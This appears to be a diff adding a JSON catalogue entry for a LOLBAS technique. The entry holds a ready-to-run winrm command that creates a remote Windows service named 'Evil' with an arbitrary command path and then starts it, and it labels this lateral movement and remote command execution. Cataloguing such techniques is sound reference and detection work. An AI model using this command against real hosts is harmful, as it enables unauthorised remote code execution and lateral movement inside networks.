@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-winrm-vbs-execute-2",
+  "name": "LOLBAS · winrm.vbs (Execute) #2",
+  "command": "winrm invoke Create wmicimv2/Win32_Service @{Name=\"Evil\";DisplayName=\"Evil\";PathName=\"{CMD}\"} -r:http://acmedc:5985 && winrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985",
+  "description": "Lateral movement/Remote Command Execution via WMI Win32_Service class over the WinRM protocol",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "winrm.vbs",
+    "execute"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/winrm.vbs/",
+  "upstream_id": "winrm.vbs/Execute/1",
+  "category": "lolbas",
+  "subcategory": "execute",
+  "references": [
+    {
+      "title": "LOLBAS — winrm.vbs",
+      "url": "https://lolbas-project.github.io/lolbas/winrm.vbs/"
+    }
+  ]
+}
